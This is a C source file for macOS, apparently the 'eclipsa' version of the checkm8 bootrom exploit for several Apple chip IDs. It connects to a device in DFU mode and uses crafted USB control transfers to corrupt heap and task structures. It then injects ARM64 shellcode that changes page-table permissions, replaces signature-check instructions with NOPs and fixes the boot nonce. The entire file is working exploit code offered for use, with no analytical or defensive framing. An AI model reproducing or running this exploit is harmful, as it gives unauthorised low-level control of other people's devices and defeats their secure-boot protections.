#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOCFPlugIn.h>
#include <IOKit/usb/IOUSBLib.h>

#if CPID == 0x7000
#	define SYNOPSYS_ROUTINE_ADDR (0x100005530)
#	define ARCH_TASK_TRAMP_ADDR (0x10000D988)
#	define IO_BUFFER_ADDR (0x18010D300)
#	define SRTG "iBoot-1992.0.0.1.19"
#	define PATCH_ADDR_0 (0x1000078B4)
#	define PATCH_ADDR_1 (0x1000078C0)
#	define PATCH_ADDR_2 (0x1000078E4)
#	define PATCH_ADDR_3 (0x100007BAC)
#	define PATCH_ADDR_4 (0x1800888C4)
#	define PATCH_ADDR_5 (0x20E029038)
#	define PATCH_ADDR_6 (0x20E02903C)
#	define PATCH_VAL_0 (0xD503201F) /* nop */
#	define PATCH_VAL_1 (0xD503201F) /* nop */
#	define PATCH_VAL_2 (0xD503201F) /* nop */
#	define PATCH_VAL_3 (0xD503201F) /* nop */
#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
#	define PATCH_VAL_5 (0xB4B4B4B4) /* Boot Nonce 0 */
#	define PATCH_VAL_6 (0xB4B4B4B4) /* Boot Nonce 1 */
#elif CPID == 0x7001
#	define SYNOPSYS_ROUTINE_ADDR (0x1000064FC)
#	define ARCH_TASK_TRAMP_ADDR (0x100010988)
#	define IO_BUFFER_ADDR (0x18010D500)
#	define SRTG "iBoot-1991.0.0.2.16"
#	define PATCH_ADDR_0 (0x10000A714)
#	define PATCH_ADDR_1 (0x10000A720)
#	define PATCH_ADDR_2 (0x10000A744)
#	define PATCH_ADDR_3 (0x10000AA08)
#	define PATCH_ADDR_4 (0x180088E44)
#	define PATCH_ADDR_5 (0x20E029038)
#	define PATCH_ADDR_6 (0x20E02903C)
#	define PATCH_VAL_0 (0xD503201F) /* nop */
#	define PATCH_VAL_1 (0xD503201F) /* nop */
#	define PATCH_VAL_2 (0xD503201F) /* nop */
#	define PATCH_VAL_3 (0xD503201F) /* nop */
#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
#	define PATCH_VAL_5 (0xB4B4B4B4) /* Boot Nonce 0 */
#	define PATCH_VAL_6 (0xB4B4B4B4) /* Boot Nonce 1 */
#elif CPID == 0x8000 || CPID == 0x8003
#	define SYNOPSYS_ROUTINE_ADDR (0x100006718)
#	define VROM_PAGE_TABLE_ADDR (0x1800C8400)
#	define ARCH_TASK_TRAMP_ADDR (0x10000D998)
#	define IO_BUFFER_ADDR (0x18010D500)
#	if CPID == 0x8000
#		define SRTG "iBoot-2234.0.0.3.3"
#	else
#		define SRTG "iBoot-2234.0.0.2.22"
#	endif
#	define PATCH_ADDR_0 (0x100007924)
#	define PATCH_ADDR_1 (0x10000792C)
#	define PATCH_ADDR_2 (0x100007958)
#	define PATCH_ADDR_3 (0x100007C9C)
#	define PATCH_ADDR_4 (0x180087954)
#	define PATCH_ADDR_5 (0x20E0B8038)
#	define PATCH_ADDR_6 (0x20E0B803C)
#	define PATCH_VAL_0 (0xD503201F) /* nop */
#	define PATCH_VAL_1 (0xD503201F) /* nop */
#	define PATCH_VAL_2 (0xD503201F) /* nop */
#	define PATCH_VAL_3 (0xD503201F) /* nop */
#	define PATCH_VAL_4 (0x00000000) /* gUSBMoreOtherStatus */
#	define PATCH_VAL_5 (0xB4B4B4B4) /* Boot Nonce 0 */
#	define PATCH_VAL_6 (0xB4B4B4B4) /* Boot Nonce 1 */
#endif

#define MAGIC (0xB4)
#define DFU_DNLOAD (1)
#define DFU_STATUS_OK (0)
#define TASK_NAME_MAX (15)
#define DFU_GET_STATUS (3)
#define DFU_CLR_STATUS (4)
#define DFU_ARCH_SZ (0x310)
#define DFU_MODE_PID (0x1227)
#define DFU_STATE_MANIFEST (7)
#define TASK_STACK_MIN (0x4000)
#define EP0_MAX_PACKET_SZ (0x40)
#define DFU_HEAP_BLOCK_SZ (0x40)
#define DFU_FILE_SUFFIX_LEN (16)
#define TASK_MAGIC_1 (0x74736B32)
#define DFU_STATE_MANIFEST_SYNC (6)
#define TASK_STACK_MAGIC (0x7374616B)
#define DFU_STATE_MANIFEST_WAIT_RESET (8)

typedef struct {
	UInt32 sz;
	kern_return_t ret;
} transfer_t;

typedef enum {
	STAGE_RESET,
	STAGE_SETUP,
	STAGE_PATCH,
	STAGE_END
} stage_t;

typedef struct {
	UInt64 prev, next;
} dfu_list_node_t;

typedef struct {
	UInt64 x[29], fp, lr, sp;
	UInt32 shc[(DFU_ARCH_SZ - 32 * sizeof(UInt64)) / sizeof(UInt32)];
} dfu_arch_t;

typedef struct {
	dfu_list_node_t list;
	UInt64 sched_ticks, delay, cb, arg;
} dfu_callout_t;

typedef struct {
	UInt32 magic_0, pad_0;
	dfu_list_node_t task_list, queue_list;
	enum {
		TASK_INITIAL,
		TASK_READY,
		TASK_RUNNING,
		TASK_BLOCKED,
		TASK_SLEEPING,
		TASK_FINISHED
	} state;
	UInt32 irq_dis_cnt;
	dfu_arch_t arch;
	dfu_callout_t callout;
	dfu_list_node_t ret_waiters_list;
	UInt32 ret, pad_1;
	UInt64 routine, arg, stack_base, stack_len;
	char name[TASK_NAME_MAX + 1];
	UInt32 id, magic_1;
} dfu_task_t;

typedef struct {
	UInt64 this_free : 1, prev_free : 1, prev_sz : 62, this_sz;
	UInt8 pad[DFU_HEAP_BLOCK_SZ - 2 * sizeof(UInt64)];
} dfu_heap_block_t;

typedef struct {
	dfu_task_t synopsys_task;
	dfu_heap_block_t heap_block;
	dfu_task_t fake_task;
	UInt8 extra[EP0_MAX_PACKET_SZ];
} dfu_overwrite_t;

typedef struct {
	stage_t stage;
	UInt16 vid, pid;
	IOUSBDeviceInterface **device;
	CFRunLoopSourceRef async_event_source;
} handle_t;

typedef struct {
	UInt8 status, poll_timeout[3], state, str_idx;
} dfu_status_t;

static void
cf_dictionary_set_int16(CFMutableDictionaryRef dict, const void *key, UInt16 val) {
	CFNumberRef cf_val = CFNumberCreate(kCFAllocatorDefault, kCFNumberSInt16Type, &val);

	if(cf_val != NULL) {
		CFDictionarySetValue(dict, key, cf_val);
		CFRelease(cf_val);
	}
}

static kern_return_t
check_usb_device_serv(io_service_t serv) {
	CFStringRef usb_serial_num = IORegistryEntryCreateCFProperty(serv, CFSTR(kUSBSerialNumberString), kCFAllocatorDefault, kNilOptions);
	kern_return_t ret = KERN_FAILURE;

	if(usb_serial_num != NULL) {
		if(CFGetTypeID(usb_serial_num) == CFStringGetTypeID() && CFStringFind(usb_serial_num, CFSTR(" SRTG:[" SRTG "]"), 0).location != kCFNotFound) {
			ret = KERN_SUCCESS;
		}
		CFRelease(usb_serial_num);
	}
	return ret;
}

static kern_return_t
query_usb_interface(io_service_t serv, CFUUIDRef plugin_type, CFUUIDRef interface_type, LPVOID *interface) {
	IOCFPlugInInterface **plugin_interface;
	kern_return_t ret = KERN_FAILURE;
	SInt32 score;

	if(IOCreatePlugInInterfaceForService(serv, plugin_type, kIOCFPlugInInterfaceID, &plugin_interface, &score) == KERN_SUCCESS) {
		ret = (*plugin_interface)->QueryInterface(plugin_interface, CFUUIDGetUUIDBytes(interface_type), interface);
		IODestroyPlugInInterface(plugin_interface);
	}
	IOObjectRelease(serv);
	return ret;
}

static void
close_usb_device(const handle_t *handle) {
	CFRunLoopRemoveSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
	CFRelease(handle->async_event_source);
	(*handle->device)->USBDeviceClose(handle->device);
	(*handle->device)->Release(handle->device);
}

static kern_return_t
open_usb_device(io_service_t serv, handle_t *handle) {
	if(query_usb_interface(serv, kIOUSBDeviceUserClientTypeID, kIOUSBDeviceInterfaceID, (LPVOID *)&handle->device) == KERN_SUCCESS) {
		if((*handle->device)->USBDeviceOpen(handle->device) == KERN_SUCCESS) {
			if((*handle->device)->SetConfiguration(handle->device, 1) == KERN_SUCCESS && (*handle->device)->CreateDeviceAsyncEventSource(handle->device, &handle->async_event_source) == KERN_SUCCESS) {
				CFRunLoopAddSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
				return KERN_SUCCESS;
			}
			(*handle->device)->USBDeviceClose(handle->device);
		}
		(*handle->device)->Release(handle->device);
	}
	return KERN_FAILURE;
}

static kern_return_t
send_usb_device_request(const handle_t *handle, UInt8 bm_request_type, UInt8 b_request, UInt16 w_value, UInt16 w_index, void *p_data, UInt16 w_length) {
	IOUSBDevRequest req;

	req.wLenDone = 0;
	req.pData = p_data;
	req.bRequest = b_request;
	req.bmRequestType = bm_request_type;
	req.wValue = OSSwapLittleToHostInt16(w_value);
	req.wIndex = OSSwapLittleToHostInt16(w_index);
	req.wLength = OSSwapLittleToHostInt16(w_length);
	return (*handle->device)->DeviceRequest(handle->device, &req);
}

static void
usb_async_cb(void *refcon, kern_return_t ret, void *arg_0) {
	transfer_t *transfer = refcon;

	if(transfer != NULL) {
		transfer->ret = ret;
		memcpy(&transfer->sz, &arg_0, sizeof(transfer->sz));
		printf("transfer_ret: 0x%" PRIX32 ", transfer_sz: 0x%" PRIX32 "\n", transfer->ret, transfer->sz);
		CFRunLoopStop(CFRunLoopGetCurrent());
	}
}

static kern_return_t
send_usb_device_request_async(const handle_t *handle, UInt8 bm_request_type, UInt8 b_request, UInt16 w_value, UInt16 w_index, void *p_data, UInt16 w_length, transfer_t *transfer) {
	IOUSBDevRequest req;

	req.wLenDone = 0;
	req.pData = p_data;
	req.bRequest = b_request;
	req.bmRequestType = bm_request_type;
	req.wValue = OSSwapLittleToHostInt16(w_value);
	req.wIndex = OSSwapLittleToHostInt16(w_index);
	req.wLength = OSSwapLittleToHostInt16(w_length);
	return (*handle->device)->DeviceRequestAsync(handle->device, &req, usb_async_cb, transfer);
}

static kern_return_t
dfu_check_status(const handle_t *handle, UInt8 status, UInt8 state) {
	dfu_status_t dfu_status;

	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBIn, kUSBClass, kUSBInterface), DFU_GET_STATUS, 0, 0, &dfu_status, sizeof(dfu_status)) == KERN_SUCCESS && dfu_status.status == status && dfu_status.state == state) {
		return KERN_SUCCESS;
	}
	return KERN_FAILURE;
}

static kern_return_t
dfu_set_state_wait_reset(const handle_t *handle) {
	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, NULL, 0) == KERN_SUCCESS && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC) == KERN_SUCCESS && dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST) == KERN_SUCCESS) {
		return dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_WAIT_RESET);
	}
	return KERN_FAILURE;
}

static kern_return_t
checkm8_stage_reset(const handle_t *handle) {
	UInt8 data[EP0_MAX_PACKET_SZ];

	memset(data, MAGIC, sizeof(data));
	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, data, DFU_FILE_SUFFIX_LEN) == KERN_SUCCESS && dfu_set_state_wait_reset(handle) == KERN_SUCCESS && send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, data, sizeof(data)) == KERN_SUCCESS) {
		return KERN_SUCCESS;
	}
	send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
	return KERN_FAILURE;
}

static kern_return_t
checkm8_stage_setup(const handle_t *handle) {
	dfu_overwrite_t overwrite;
	transfer_t transfer;

	memset(&overwrite, MAGIC, sizeof(overwrite));
	do {
		if(send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, &overwrite, sizeof(overwrite), &transfer) != KERN_SUCCESS || (*handle->device)->USBDeviceAbortPipeZero(handle->device) != KERN_SUCCESS) {
			break;
		}
		CFRunLoopRun();
		if(transfer.ret == kIOReturnAborted && transfer.sz <= sizeof(overwrite.extra)) {
			if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, &overwrite, (UInt16)(offsetof(dfu_overwrite_t, synopsys_task.callout) - transfer.sz)) != kIOUSBPipeStalled) {
				break;
			}
			return send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
		}
	} while(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_DNLOAD, 0, 0, &overwrite.extra, sizeof(overwrite.extra)) == KERN_SUCCESS);
	return KERN_FAILURE;
}

static kern_return_t
checkm8_stage_patch(const handle_t *handle) {
	dfu_overwrite_t overwrite;
	UInt32 *shc;

	memset(&overwrite, '\0', sizeof(overwrite));
	overwrite.synopsys_task.id = 5;
	strcpy(overwrite.synopsys_task.name, "usb");
	overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
	overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
	overwrite.synopsys_task.routine = SYNOPSYS_ROUTINE_ADDR;
	overwrite.synopsys_task.stack_base = IO_BUFFER_ADDR + offsetof(dfu_overwrite_t, fake_task);
	overwrite.synopsys_task.ret_waiters_list.prev = overwrite.synopsys_task.ret_waiters_list.next = overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);

	overwrite.heap_block.prev_sz = sizeof(overwrite.synopsys_task) / sizeof(overwrite.heap_block) + 1;
	overwrite.heap_block.this_sz = overwrite.synopsys_task.stack_len / sizeof(overwrite.heap_block) + 2;

	overwrite.fake_task.id = 6;
	overwrite.fake_task.irq_dis_cnt = 1;
	overwrite.fake_task.state = TASK_RUNNING;
	overwrite.fake_task.magic_1 = TASK_MAGIC_1;
	strcpy(overwrite.fake_task.name, "eclipsa");
	shc = overwrite.fake_task.arch.shc;
#if CPID == 0x8000 || CPID == 0x8003
	overwrite.fake_task.arg = VROM_PAGE_TABLE_ADDR;
	*shc++ = 0xD50343DF; /* msr DAIFSet, #(DAIFSC_IRQF | DAIFSC_FIQF) */
	*shc++ = 0xD5033FDF; /* isb */
	*shc++ = 0xF940000A; /* ldr x10, [x0] */
	*shc++ = 0xB24B054A; /* orr x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
	*shc++ = 0x9278F94A; /* bic x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
	*shc++ = 0xF900000A; /* str x10, [x0] */
	*shc++ = 0xD5033F9F; /* dsb sy */
	*shc++ = 0xD50E871F; /* tlbi alle3 */
	*shc++ = 0xD5033F9F; /* dsb sy */
	*shc++ = 0xD5033FDF; /* isb */
	*shc++ = 0x10000328; /* adr x8, #0x64 */
#else
	*shc++ = 0x10000208; /* adr x8, #0x40 */
#endif
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB9000269; /* str w9, [x19] */
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB9000289; /* str w9, [x20] */
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB90002A9; /* str w9, [x21] */
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB90002C9; /* str w9, [x22] */
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB90002E9; /* str w9, [x23] */
	*shc++ = 0xB8404509; /* ldr w9, [x8], #4 */
	*shc++ = 0xB9000309; /* str w9, [x24] */
	*shc++ = 0xB9400109; /* ldr w9, [x8] */
	*shc++ = 0xB9000329; /* str w9, [x25] */
#if CPID == 0x8000 || CPID == 0x8003
	*shc++ = 0x9249F54A; /* bic x10, x10, #(ARM_TTE_BLOCK_PNX | ARM_TTE_BLOCK_NX) */
	*shc++ = 0xB279014A; /* orr x10, x10, #ARM_TTE_BLOCK_AP_PRIV */
	*shc++ = 0xF900000A; /* str x10, [x0] */
	*shc++ = 0xD5033F9F; /* dsb sy */
	*shc++ = 0xD50E871F; /* tlbi alle3 */
	*shc++ = 0xD5033F9F; /* dsb sy */
	*shc++ = 0xD5033FDF; /* isb */
	*shc++ = 0xD50343FF; /* msr DAIFClr, #(DAIFSC_IRQF | DAIFSC_FIQF) */
	*shc++ = 0xD5033FDF; /* isb */
#endif
	*shc++ = 0xD65F03C0; /* ret */
	*shc++ = PATCH_VAL_0;
	*shc++ = PATCH_VAL_1;
	*shc++ = PATCH_VAL_2;
	*shc++ = PATCH_VAL_3;
	*shc++ = PATCH_VAL_4;
	*shc++ = PATCH_VAL_5;
	*shc = PATCH_VAL_6;
	overwrite.fake_task.arch.x[19] = PATCH_ADDR_0;
	overwrite.fake_task.arch.x[20] = PATCH_ADDR_1;
	overwrite.fake_task.arch.x[21] = PATCH_ADDR_2;
	overwrite.fake_task.arch.x[22] = PATCH_ADDR_3;
	overwrite.fake_task.arch.x[23] = PATCH_ADDR_4;
	overwrite.fake_task.arch.x[24] = PATCH_ADDR_5;
	overwrite.fake_task.arch.x[25] = PATCH_ADDR_6;
	overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
	overwrite.fake_task.arch.lr = ARCH_TASK_TRAMP_ADDR;
	overwrite.fake_task.stack_len = overwrite.synopsys_task.stack_len;
	overwrite.fake_task.stack_base = overwrite.synopsys_task.stack_base;
	overwrite.fake_task.arch.sp = overwrite.fake_task.stack_base + overwrite.fake_task.stack_len;
	overwrite.fake_task.routine = overwrite.fake_task.stack_base + offsetof(dfu_task_t, arch.shc);
	overwrite.fake_task.queue_list.prev = overwrite.fake_task.queue_list.next = IO_BUFFER_ADDR + offsetof(dfu_task_t, ret_waiters_list);
	overwrite.fake_task.ret_waiters_list.prev = overwrite.fake_task.ret_waiters_list.next = overwrite.fake_task.stack_base + offsetof(dfu_task_t, ret_waiters_list);
	if(send_usb_device_request(handle, USBmakebmRequestType(kUSBOut, kUSBStandard, kUSBDevice), kUSBRqGetStatus, 0, 0, &overwrite.synopsys_task.callout, sizeof(overwrite) - offsetof(dfu_overwrite_t, synopsys_task.callout)) == kIOUSBPipeStalled) {
		return send_usb_device_request_async(handle, USBmakebmRequestType(kUSBOut, kUSBClass, kUSBInterface), DFU_CLR_STATUS, 0, 0, NULL, 0, NULL);
	}
	return KERN_FAILURE;
}

static void
attached_usb_handle(void *refcon, io_iterator_t iter) {
	handle_t *handle = refcon;
	kern_return_t ret;
	io_service_t serv;

	while((serv = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
		if(check_usb_device_serv(serv) == KERN_SUCCESS) {
			puts("Found the USB device.");
			if(open_usb_device(serv, handle) == KERN_SUCCESS) {
				if(handle->stage == STAGE_RESET) {
					ret = checkm8_stage_reset(handle);
					printf("Stage: RESET");
					handle->stage = STAGE_SETUP;
				} else if(handle->stage == STAGE_SETUP) {
					ret = checkm8_stage_setup(handle);
					printf("Stage: SETUP");
					handle->stage = STAGE_PATCH;
				} else {
					ret = checkm8_stage_patch(handle);
					printf("Stage: PATCH");
					handle->stage = STAGE_END;
				}
				printf(", ret: 0x%" PRIX32 "\n", ret);
				if((*handle->device)->USBDeviceReEnumerate(handle->device, 0) != KERN_SUCCESS || ret != KERN_SUCCESS) {
					handle->stage = STAGE_RESET;
				}
				close_usb_device(handle);
				if(handle->stage == STAGE_END) {
					CFRunLoopStop(CFRunLoopGetCurrent());
				}
			}
		} else {
			IOObjectRelease(serv);
		}
	}
}

static void
eclipsa(handle_t *handle) {
	IONotificationPortRef notify_port = IONotificationPortCreate(kIOMasterPortDefault);
	CFMutableDictionaryRef matching_dict;
	CFRunLoopSourceRef run_loop_source;
	io_iterator_t attach_iter;

	if(notify_port != NULL) {
		if((run_loop_source = IONotificationPortGetRunLoopSource(notify_port)) != NULL) {
			CFRunLoopAddSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopDefaultMode);
			if((matching_dict = IOServiceMatching(kIOUSBDeviceClassName)) != NULL) {
				cf_dictionary_set_int16(matching_dict, CFSTR(kUSBVendorID), handle->vid);
				cf_dictionary_set_int16(matching_dict, CFSTR(kUSBProductID), handle->pid);
				if(IOServiceAddMatchingNotification(notify_port, kIOFirstMatchNotification, matching_dict, attached_usb_handle, handle, &attach_iter) == KERN_SUCCESS) {
					printf("Waiting for the USB device with VID: 0x%" PRIX16 ", PID: 0x%" PRIX16 ", SRTG: " SRTG "\n", handle->vid, handle->pid);
					attached_usb_handle(handle, attach_iter);
					if(handle->stage != STAGE_END) {
						CFRunLoopRun();
					}
					IOObjectRelease(attach_iter);
				}
			}
			CFRunLoopRemoveSource(CFRunLoopGetCurrent(), run_loop_source, kCFRunLoopDefaultMode);
		}
		IONotificationPortDestroy(notify_port);
	}
}

int
main(void) {
	handle_t handle;

	handle.pid = DFU_MODE_PID;
	handle.stage = STAGE_RESET;
	handle.vid = kAppleVendorID;
	eclipsa(&handle);
}
